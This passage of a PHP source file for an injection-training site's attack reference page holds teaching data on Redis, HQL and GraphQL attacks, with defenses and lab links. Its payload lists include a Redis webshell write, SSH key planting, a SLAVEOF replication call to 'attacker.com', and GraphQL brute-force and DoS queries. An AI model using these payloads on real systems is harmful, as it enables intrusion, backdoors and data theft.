            '<strong>Inject arbitrary commands</strong>: <code>value\\r\\nGET secret_key\\r\\n</code> to read other keys.',
            '<strong>For file write</strong>: <code>\\r\\nCONFIG SET dir /var/www/html\\r\\nCONFIG SET dbfilename shell.php\\r\\nSAVE\\r\\n</code>.',
            '<strong>For Lua injection</strong>: If EVAL is used, inject Lua code for server-side execution.',
        ],

        'payloads' => [
            ['label' => 'CRLF: read another key', 'code' => "value\\r\\nGET secret_key\\r\\n"],
            ['label' => 'CRLF: set arbitrary data', 'code' => "value\\r\\nSET hacked true\\r\\n"],
            ['label' => 'File write (webshell)', 'code' => "x\\r\\nCONFIG SET dir /var/www/html\\r\\nCONFIG SET dbfilename shell.php\\r\\nSET payload '<?php system(\\$_GET[c]);?>'\\r\\nSAVE\\r\\n"],
            ['label' => 'SSH key injection', 'code' => "x\\r\\nCONFIG SET dir /root/.ssh\\r\\nCONFIG SET dbfilename authorized_keys\\r\\nSET key 'ssh-rsa AAAA...'\\r\\nSAVE\\r\\n"],
            ['label' => 'Lua EVAL injection', 'code' => "EVAL \"return redis.call('GET','secret')\" 0"],
            ['label' => 'SLAVEOF exfiltration', 'code' => "\\r\\nSLAVEOF attacker.com 6379\\r\\n"],
        ],

        'techniques' => [
            'CRLF Injection' => 'Break out of <code>SET key value</code> with <code>\\r\\n</code> to inject arbitrary Redis commands. The key insight: Redis processes commands line by line, so CRLF creates a new command boundary.',
            'CONFIG SET'     => '<code>CONFIG SET dir /path</code> changes the working directory. <code>CONFIG SET dbfilename file.php</code> changes the dump filename. <code>SAVE</code> writes the database to that file. The file will contain Redis binary data plus any string values set by the attacker.',
            'Lua Injection'  => '<code>EVAL "lua code" 0</code> executes Lua server-side. <code>redis.call()</code> can execute any Redis command from within Lua. Useful when direct CRLF injection is blocked but EVAL is accessible.',
            'SLAVEOF'        => '<code>SLAVEOF attacker.com 6379</code> makes the Redis instance a replica of the attacker\'s Redis server. The attacker receives a full copy of all data. Also enables <code>MODULE LOAD</code> for RCE via rogue Redis server.',
        ],

        'mistakes' => [
            'Forgetting proper CRLF encoding: must use actual \\r\\n bytes, not literal text',
            'CONFIG SET writes the entire Redis dump, not just the injected value: file will contain binary garbage around the payload',
            'Not checking if CONFIG command is renamed or disabled (common in production Redis deployments)',
            'SLAVEOF sends all data, not specific keys: it\'s all-or-nothing exfiltration',
        ],

        'real_world' => 'Redis CRLF injection and the CONFIG SET file write technique have been used in numerous cloud compromise incidents, particularly in environments where Redis is exposed without authentication (default configuration). The SLAVEOF attack was demonstrated at Black Hat to achieve RCE by loading malicious modules. Redis security has improved significantly since version 6.0 with ACLs and protected mode, but misconfigured instances remain a common finding.',

        'defense' => '<strong>Never embed user input directly into Redis commands.</strong> Use parameterized Redis client libraries that handle escaping. Rename or disable dangerous commands (CONFIG, SLAVEOF, MODULE, DEBUG, EVAL) using Redis ACLs or the <code>rename-command</code> directive. Enable protected mode and require authentication. Use network segmentation to prevent direct Redis access from untrusted networks.',
    ],

    'hql-injection' => [
        'name'       => 'ORM Injection (HQL/JPQL)',
        'icon'       => 'H',
        'categories' => ['HQL Injection'],
        'severity'   => 'medium',
        'prereqs'    => 'Understanding of Java Hibernate/JPA, object-relational mapping concepts, and HQL/JPQL syntax vs SQL syntax.',

        'summary' => 'HQL (Hibernate Query Language) injection targets Java applications that use Hibernate ORM. HQL is more limited than SQL (no UNION, no direct table access, no stacked queries by default) but still allows data extraction through entity manipulation, metadata access, and native query escape.',

        'how' => '<p>Hibernate translates HQL queries into SQL behind the scenes. HQL operates on <strong>Java entity objects</strong> rather than database tables directly. This means:</p>
<ul>
<li>Table names are replaced by Java class names (e.g., <code>FROM User</code> not <code>FROM users</code>)</li>
<li>Column names are replaced by Java property names (e.g., <code>u.passwordHash</code> not <code>password_hash</code>)</li>
<li>No UNION SELECT (HQL doesn\'t support it in most versions)</li>
<li>No stacked queries (Hibernate executes one query at a time)</li>
</ul>
<p>Despite these limitations, HQL injection can:</p>
<ul>
<li><strong>Access other entities:</strong> If the attacker can control the FROM clause, they can query any mapped entity (e.g., <code>AdminCredential</code> instead of <code>Product</code>).</li>
<li><strong>Leak metadata:</strong> Access <code>.class</code> property to discover entity names and class hierarchies.</li>
<li><strong>Escape to native SQL:</strong> If the application uses <code>createNativeQuery()</code> or <code>createSQLQuery()</code>, full SQL injection is possible.</li>
<li><strong>Boolean/error extraction:</strong> Conditional expressions and intentional errors work similarly to SQL injection.</li>
</ul>',

        'indicators' => [
            'Error messages mention Hibernate, JPA, or HQL syntax',
            'Java stack traces with org.hibernate or javax.persistence packages',
            'Entity names (CamelCase Java class names) appear in error messages',
            'The application is a Java/Spring Boot application',
        ],

        'steps' => [
            '<strong>Identify HQL context</strong>: Look for Hibernate/JPA error messages. HQL uses Java class names, not table names.',
            '<strong>Discover entities</strong>: Inject invalid entity names to trigger errors that reveal available entities.',
            '<strong>Access .class metadata</strong>: Use <code>.class.name</code> to discover entity class names and properties.',
            '<strong>Query unauthorized entities</strong>: Change the FROM clause to access entities like AdminCredential, SecretVault, etc.',
            '<strong>Attempt native SQL escape</strong>: If the application mixes HQL with native queries, full SQL injection may be possible.',
        ],

        'payloads' => [
            ['label' => 'Entity discovery (error)', 'code' => "InvalidEntityName  (triggers error listing available entities)"],
            ['label' => 'Access .class metadata', 'code' => "' OR entity.class.name LIKE '%Admin%'-- "],
            ['label' => 'Query another entity', 'code' => "AdminCredential  (in entity name parameter)"],
            ['label' => 'Boolean extraction', 'code' => "' AND SUBSTRING(entity.password,1,1)='a'-- "],
            ['label' => 'Native SQL escape', 'code' => "') UNION ALL SELECT * FROM admin_table-- "],
        ],

        'techniques' => [
            'Entity Injection'  => 'If the application lets users control which entity to query (e.g., <code>FROM $userInput</code>), try different entity names. Error messages often reveal the list of valid entities.',
            '.class Metadata'   => 'Hibernate\'s <code>.class</code> property exposes Java reflection metadata. <code>entity.class.name</code> returns the fully qualified class name. <code>entity.class.declaredFields</code> reveals field names.',
            'Native Query Escape' => 'If the application uses <code>createNativeQuery()</code> or <code>createSQLQuery()</code>, the query is SQL, not HQL. Full SQL injection (UNION, stacked queries) becomes possible.',
            'Criteria API Bypass' => 'If the application builds queries using the Criteria API with string concatenation in restrictions, injection into SQL fragments is possible. Test <code>sql_restriction</code> parameters.',
            'Cache Poisoning'   => 'Hibernate\'s query cache stores results by query string. Injecting into a cached query can poison the cache, affecting other users\' results.',
        ],

        'mistakes' => [
            'Expecting UNION to work in HQL. It doesn\'t in most Hibernate versions',
            'Using SQL syntax instead of HQL syntax. HQL uses Java class/property names, not table/column names',
            'Not checking whether the query is HQL or native SQL: the attack strategy differs completely',
            'Overlooking the .class metadata access: it\'s unique to HQL and very powerful for reconnaissance',
        ],

        'real_world' => 'HQL injection is common in Java enterprise applications, particularly older Spring/Hibernate applications built before parameterized HQL became standard practice. The .class metadata access technique was first documented by security researchers analyzing Hibernate\'s reflection capabilities. Many organizations use Hibernate\'s Criteria API incorrectly, creating injection points in SQL restriction fragments.',

        'defense' => '<strong>Use parameterized HQL queries:</strong> <code>query.setParameter("name", userInput)</code> instead of string concatenation. The JPA Criteria API with <code>CriteriaBuilder</code> is safe when used correctly. Avoid <code>createNativeQuery()</code> with user input. Input validation: whitelist allowed entity names instead of accepting arbitrary input.',
    ],

    'graphql-attacks' => [
        'name'       => 'GraphQL Attacks',
        'icon'       => 'G',
        'categories' => ['Enumeration', 'Auth Bypass'],
        'severity'   => 'high',
        'prereqs'    => 'Understanding of GraphQL query syntax (queries, mutations, fragments, aliases). Basic knowledge of API authentication patterns.',

        'summary' => 'GraphQL attacks exploit the rich type system and flexible query language of GraphQL APIs. Unlike REST, GraphQL clients choose what data to request: and if authorization is weak, they can request data they shouldn\'t have access to. Introspection, aliasing, batching, and nested queries are all attack vectors.',

        'how' => '<h5 style="color:var(--neon2);margin:12px 0 6px;">Introspection</h5>
<p>GraphQL has a built-in schema discovery feature: the <code>__schema</code> and <code>__type</code> meta-fields. An introspection query returns the <strong>entire API schema</strong>: every type, field, argument, and relationship. This is equivalent to dumping <code>information_schema</code> in SQL. Most production APIs should disable introspection, but many don\'t.</p>

<h5 style="color:var(--neon2);margin:12px 0 6px;">Field Suggestion Exploitation</h5>
<p>Even when introspection is disabled, querying a non-existent field triggers a "Did you mean?" error that suggests similar valid field names. By systematically querying misspelled fields, the attacker can reconstruct the schema.</p>

<h5 style="color:var(--neon2);margin:12px 0 6px;">Authorization Bypass</h5>
<p>GraphQL resolvers handle authorization per-field. If a resolver doesn\'t check permissions, the data is returned regardless of the user\'s role. Aliases allow fetching the same query with different arguments in one request, testing multiple authorization boundaries simultaneously.</p>

<h5 style="color:var(--neon2);margin:12px 0 6px;">Batching / Alias Attacks</h5>
<p>A single GraphQL request can contain multiple operations using aliases: <code>a1: login(pass:"000") a2: login(pass:"001")</code>. This enables brute-force attacks that bypass rate limiting (one HTTP request = hundreds of operations). OTP bypass, password brute-force, and enumeration attacks all benefit from batching.</p>

<h5 style="color:var(--neon2);margin:12px 0 6px;">Nested Query DoS</h5>
<p>Circular relationships (User -> Posts -> Author -> Posts -> Author -> ...) allow deeply nested queries that cause exponential resolver calls. Without depth limits, this can crash the server.</p>',

        'indicators' => [
            'The application has a /graphql endpoint',
            'Sending a query like {__typename} returns a type name',
            'Error messages mention GraphQL, resolver, or type system concepts',
            'The API accepts JSON with a "query" field',
        ],

        'steps' => [
            '<strong>Discover the endpoint</strong>: Common paths: <code>/graphql</code>, <code>/api/graphql</code>, <code>/v1/graphql</code>. Try sending <code>{"query": "{__typename}"}</code>.',
            '<strong>Run introspection</strong>: <code>{__schema{types{name fields{name type{name}}}}}</code>. If blocked, try field suggestion exploitation.',
            '<strong>Map the schema</strong>: Identify all queries, mutations, types, and relationships.',
            '<strong>Test authorization</strong>: Query sensitive types/fields as an unauthenticated or low-privilege user.',
            '<strong>Attempt batching</strong>: Use aliases to send multiple operations in one request: <code>{a:user(id:1){secret} b:user(id:2){secret}}</code>.',
            '<strong>Test depth limits</strong>: Send deeply nested queries to check for DoS protection.',
        ],

        'payloads' => [
            ['label' => 'Full introspection query', 'code' => '{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind ofType{name}}}}}}'],
            ['label' => 'List all types', 'code' => '{__schema{types{name}}}'],
            ['label' => 'Explore a specific type', 'code' => '{__type(name:"User"){name fields{name type{name}}}}'],
            ['label' => 'Field suggestion (typo)', 'code' => '{users{passwrd}} : triggers "Did you mean password?"'],
            ['label' => 'Authorization test', 'code' => '{secretflags{id flag description}}'],
            ['label' => 'Alias batching (brute-force)', 'code' => '{a:login(password:"000"){token} b:login(password:"001"){token} c:login(password:"002"){token}}'],
            ['label' => 'Nested DoS', 'code' => '{users{posts{author{posts{author{posts{author{name}}}}}}}}'],
            ['label' => 'Mutation test', 'code' => 'mutation{updateUser(id:1,role:"admin"){id role}}'],
        ],

        'techniques' => [
            'Introspection'    => 'The <code>__schema</code> meta-field returns the complete API schema. <code>__type(name:"X")</code> returns details about type X. Tools like GraphQL Voyager or InQL can visualize the schema. <strong>Always try introspection first</strong>: it\'s the equivalent of dumping the database schema.',
            'Field Suggestion'  => 'When introspection is disabled, query non-existent fields. GraphQL servers often respond with "Did you mean [field]?" suggestions. Automate this with wordlists of common field names (password, secret, token, flag, admin, role).',
            'Alias Auth Bypass' => 'Aliases let you fetch data with different arguments in one request. If authorization is checked at the query level but not the field level, aliases bypass it: <code>{public:user(id:1){name} private:user(id:1){password}}</code>.',
            'Batching'          => 'Send hundreds of operations in one request using aliases or array syntax. Bypasses rate limiting that counts HTTP requests. Effective for: password brute-force, OTP bypass, user enumeration.',
            'Nested Query DoS'  => 'Exploit circular type references (User->Posts->Author->Posts...) to create exponentially deep queries. Without query depth or complexity limits, this causes server resource exhaustion.',
        ],

        'mistakes' => [
            'Assuming disabling introspection prevents schema discovery: field suggestions still leak information',
            'Only testing queries, not mutations: mutations often have weaker authorization',
            'Not realizing that GraphQL batching bypasses per-request rate limiting',
            'Sending introspection as GET instead of POST (or vice versa): some servers only accept one method',
            'Not testing with and without authentication tokens: some fields may be accessible without auth',
        ],

        'real_world' => 'GraphQL security issues are increasingly common as adoption grows. Facebook (creator of GraphQL) has fixed multiple introspection and authorization issues in their own API. Bug bounty programs on HackerOne and Bugcrowd frequently see GraphQL-related findings, particularly introspection exposure and broken authorization. The 2019 Shopify GraphQL vulnerability allowed attackers to access other merchants\' data through improper resolver authorization.',

        'defense' => '<strong>Disable introspection in production.</strong> Implement per-field authorization in every resolver (not just at the query level). Set query depth limits (typically 7-10 levels max). Set query complexity limits to prevent batching abuse. Rate limit by <strong>operation count</strong>, not just HTTP request count. Use persisted queries (whitelist approach) in production. Disable field suggestions or return generic error messages.',
    ],
];

/* Build a reverse map: category -> topic slug */
$categoryToTopic = [];
foreach ($topics as $slug => $topic) {
    foreach ($topic['categories'] as $cat) {
        $categoryToTopic[$cat] = $slug;
    }
}

/* Build a flat list of all labs with their DB info for cross-referencing */
$labsByCategory = [];
$curriculum = [
    'mysql'    => ['name' => 'MySQL',            'color' => 'mysql',    'icon' => 'MY'],
    'pgsql'    => ['name' => 'PostgreSQL',        'color' => 'pgsql',    'icon' => 'PG'],
    'sqlite'   => ['name' => 'SQLite',            'color' => 'sqlite',   'icon' => 'SL'],
    'mssql'    => ['name' => 'MS SQL Server',     'color' => 'mssql',    'icon' => 'MS'],
    'oracle'   => ['name' => 'Oracle DB',         'color' => 'oracle',   'icon' => 'OR'],
    'mariadb'  => ['name' => 'MariaDB',           'color' => 'mariadb',  'icon' => 'MA'],
    'mongodb'  => ['name' => 'MongoDB',           'color' => 'mongodb',  'icon' => 'MG'],
    'redis'    => ['name' => 'Redis',             'color' => 'redis',    'icon' => 'RD'],
    'hql'      => ['name' => 'HQL (Hibernate)',   'color' => 'hql',      'icon' => 'HQ'],
    'graphql'  => ['name' => 'GraphQL',           'color' => 'graphql',  'icon' => 'GQ'],
];

/* Include lab data from curriculum for cross-reference */
require __DIR__ . '/curriculum_data.php';

foreach ($curriculumData as $dbKey => $db) {
    foreach ($db['labs'] as $lab) {
        $cat = $lab['category'];
        if (!isset($labsByCategory[$cat])) $labsByCategory[$cat] = [];
        $labsByCategory[$cat][] = [
            'db'         => $dbKey,
            'dbName'     => $curriculum[$dbKey]['name'] ?? $dbKey,
            'dbColor'    => $curriculum[$dbKey]['color'] ?? 'mysql',
            'dbIcon'     => $curriculum[$dbKey]['icon'] ?? '??',
            'num'        => $lab['num'],
            'title'      => $lab['title'],
            'status'     => $lab['status'],
            'difficulty' => $lab['difficulty'],
        ];
    }
}

$activeTopic = $_GET['topic'] ?? array_key_first($topics);
if (!isset($topics[$activeTopic])) $activeTopic = array_key_first($topics);

$severityColors = [
    'critical' => '#ff4444',
    'high'     => '#ff8c00',
    'medium'   => '#ffd700',
    'low'      => '#44cc44',
];
?>

<div class="container">

    <section class="hero anim" style="padding:36px 0 20px;">
        <div class="hero-eyebrow">
            <span class="dot"></span>
            injection technique reference
        </div>
        <h1><span class="hl">Attack Types</span></h1>
        <p class="hero-sub">
            Deep-dive into every injection technique. Theory, real-world context, multi-database payloads, common pitfalls, and linked practice labs.
        </p>
    </section>

    <div class="cur-layout anim anim-d1">

        <!-- ========== SIDEBAR ========== -->
        <aside class="cur-sidebar" id="topicSidebar">
            <?php foreach ($topics as $slug => $topic): ?>
                <?php
                    $relatedLabCount = 0;
                    foreach ($topic['categories'] as $cat) {
                        $relatedLabCount += count($labsByCategory[$cat] ?? []);
                    }
                    $sevColor = $severityColors[$topic['severity'] ?? 'medium'] ?? '#ffd700';
                ?>
                <a href="<?= url_topic($slug) ?>"
                   class="cur-sb-item <?= $slug === $activeTopic ? 'active' : '' ?>"
                   data-topic="<?= $slug ?>"
                   style="--sb-color: var(--neon); --sb-color-g: var(--neon-dim); text-decoration:none;">
                    <span class="cur-sb-icon" style="color:var(--neon2);background:var(--neon-dim);"><?= htmlspecialchars($topic['icon']) ?></span>
                    <span class="cur-sb-info">
                        <span class="cur-sb-name"><?= htmlspecialchars($topic['name']) ?></span>
                        <span class="cur-sb-meta"><?= $relatedLabCount ?> labs &bull; <span style="color:<?= $sevColor ?>;"><?= ucfirst($topic['severity'] ?? 'medium') ?></span></span>
                    </span>
                </a>
            <?php endforeach; ?>
        </aside>

        <!-- ========== MAIN CONTENT ========== -->
        <main class="cur-main">
            <?php $t = $topics[$activeTopic]; $sevColor = $severityColors[$t['severity'] ?? 'medium'] ?? '#ffd700'; ?>

            <div class="topic-header">
                <h2><?= htmlspecialchars($t['name']) ?></h2>
                <div style="display:flex;gap:10px;align-items:center;margin-top:6px;flex-wrap:wrap;">
                    <span style="font-family:var(--font-mono);font-size:11px;padding:3px 10px;border-radius:4px;background:<?= $sevColor ?>22;color:<?= $sevColor ?>;border:1px solid <?= $sevColor ?>55;font-weight:600;">SEVERITY: <?= strtoupper($t['severity'] ?? 'MEDIUM') ?></span>
                    <?php if (!empty($t['databases'])): ?>
                        <?php foreach ($t['databases'] as $db): ?>
                            <span style="font-family:var(--font-mono);font-size:10px;padding:2px 8px;border-radius:3px;background:var(--bg-card);border:1px solid var(--line);color:var(--text-2);"><?= htmlspecialchars($db) ?></span>
                        <?php endforeach; ?>
                    <?php endif; ?>
                </div>
            </div>

            <div class="topic-body">

                <!-- Prerequisites -->
                <?php if (!empty($t['prereqs'])): ?>
                <div class="topic-section">
                    <div class="topic-label">// prerequisites</div>
                    <p class="topic-text" style="color:var(--text-2);font-style:italic;"><?= htmlspecialchars($t['prereqs']) ?></p>
                </div>
                <?php endif; ?>

                <!-- Summary -->
                <div class="topic-section">
                    <div class="topic-label">// what is it</div>
                    <p class="topic-text"><?= $t['summary'] ?></p>
                </div>

                <!-- How it works (detailed) -->
                <div class="topic-section">
                    <div class="topic-label">// how it works</div>
                    <div class="topic-text"><?= $t['how'] ?></div>
                </div>

                <!-- How to detect -->
                <?php if (!empty($t['indicators'])): ?>
                <div class="topic-section">
                    <div class="topic-label">// how to identify</div>
                    <ul class="topic-steps" style="list-style:none;padding-left:0;">
                        <?php foreach ($t['indicators'] as $ind): ?>
                            <li style="padding-left:20px;position:relative;"><span style="position:absolute;left:0;color:var(--neon2);">&#9656;</span> <?= $ind ?></li>
                        <?php endforeach; ?>
                    </ul>
                </div>
                <?php endif; ?>

                <!-- Attack Steps -->
                <div class="topic-section">
                    <div class="topic-label">// attack methodology</div>
                    <ol class="topic-steps">
                        <?php foreach ($t['steps'] as $step): ?>
                            <li><?= $step ?></li>
                        <?php endforeach; ?>
                    </ol>
                </div>

                <!-- Payloads -->
                <?php if (!empty($t['payloads'])): ?>
                <div class="topic-section">
                    <div class="topic-label">// payload reference</div>
                    <div style="display:flex;flex-direction:column;gap:6px;">
                        <?php foreach ($t['payloads'] as $p): ?>
                        <div style="background:var(--bg-card);border:1px solid var(--line);border-radius:6px;padding:8px 12px;">
                            <div style="font-family:var(--font-mono);font-size:10px;color:var(--neon2);margin-bottom:4px;text-transform:uppercase;letter-spacing:0.5px;"><?= htmlspecialchars($p['label']) ?></div>
                            <pre style="margin:0;font-size:12px;color:var(--text-0);white-space:pre-wrap;word-break:break-all;"><?= htmlspecialchars($p['code']) ?></pre>
                        </div>
                        <?php endforeach; ?>
                    </div>
                </div>
                <?php endif; ?>

                <!-- DB-specific techniques -->
                <?php if (!empty($t['techniques'])): ?>
                    <div class="topic-section">
                        <div class="topic-label">// techniques by target</div>
                        <div class="topic-tech-grid">
                            <?php foreach ($t['techniques'] as $db => $desc): ?>
                                <div class="topic-tech-item">
                                    <span class="topic-tech-db"><?= htmlspecialchars($db) ?></span>
                                    <span class="topic-tech-desc"><?= $desc ?></span>
                                </div>
                            <?php endforeach; ?>
                        </div>
                    </div>
                <?php endif; ?>

                <!-- Common Mistakes -->
                <?php if (!empty($t['mistakes'])): ?>
                <div class="topic-section">
                    <div class="topic-label">// common mistakes</div>
                    <ul class="topic-steps" style="list-style:none;padding-left:0;">
                        <?php foreach ($t['mistakes'] as $m): ?>
                            <li style="padding-left:20px;position:relative;"><span style="position:absolute;left:0;color:var(--neon3);">&#10007;</span> <?= $m ?></li>
                        <?php endforeach; ?>
                    </ul>
                </div>
                <?php endif; ?>

                <!-- Real World Context -->
                <?php if (!empty($t['real_world'])): ?>
                <div class="topic-section">
                    <div class="topic-label">// real-world context</div>
                    <div class="topic-text" style="border-left:3px solid var(--neon);padding-left:14px;"><?= $t['real_world'] ?></div>
                </div>
                <?php endif; ?>

                <!-- Defense -->
                <div class="topic-section">
                    <div class="topic-label">// defense &amp; remediation</div>
                    <div class="topic-defense"><?= $t['defense'] ?></div>
                </div>

                <!-- Related Labs -->
                <div class="topic-section">
                    <div class="topic-label">// practice labs</div>
                    <?php
                        $relatedLabs = [];
                        foreach ($t['categories'] as $cat) {
                            foreach ($labsByCategory[$cat] ?? [] as $lab) {
                                $relatedLabs[] = $lab;
                            }
                        }
                    ?>
                    <?php if (empty($relatedLabs)): ?>
                        <p class="topic-text" style="color:var(--text-2);">No labs mapped to this topic yet.</p>
                    <?php else: ?>
                        <div class="topic-labs">
                            <?php foreach ($relatedLabs as $lab): ?>
                                <?php
                                    $isLive = $lab['status'] === 'live';
                                    $href = $isLive
                                        ? url_lab($lab['db'], $lab['num'])
                                        : url_engine($lab['db']);
                                ?>
                                <a href="<?= $href ?>" class="topic-lab-item <?= !$isLive ? 'topic-lab--planned' : '' ?>">
                                    <span class="topic-lab-icon" style="color:var(--<?= $lab['dbColor'] ?>);background:var(--<?= $lab['dbColor'] ?>-g);"><?= htmlspecialchars($lab['dbIcon']) ?></span>
                                    <span class="topic-lab-info">
                                        <span class="topic-lab-title"><?= htmlspecialchars($lab['title']) ?></span>
                                        <span class="topic-lab-meta">
                                            <?= htmlspecialchars($lab['dbName']) ?> #<?= str_pad($lab['num'], 2, '0', STR_PAD_LEFT) ?>
                                            <span class="cur-card-diff cur-d-<?= $lab['difficulty'] ?>" style="font-size:9px;padding:1px 7px;"><?= ucfirst($lab['difficulty']) ?></span>
                                        </span>
                                    </span>
                                    <?php if ($isLive): ?>
                                        <span class="cur-card-live" style="font-size:8px;padding:1px 6px;">LIVE</span>
                                    <?php else: ?>
                                        <span style="font-family:var(--font-mono);font-size:9px;color:var(--text-2);">PLANNED</span>
                                    <?php endif; ?>
                                </a>
                            <?php endforeach; ?>
                        </div>
                    <?php endif; ?>
                </div>

            </div>

        </main>

    </div>

</div>

<?php require_once __DIR__ . '/../includes/footer.php'; ?>
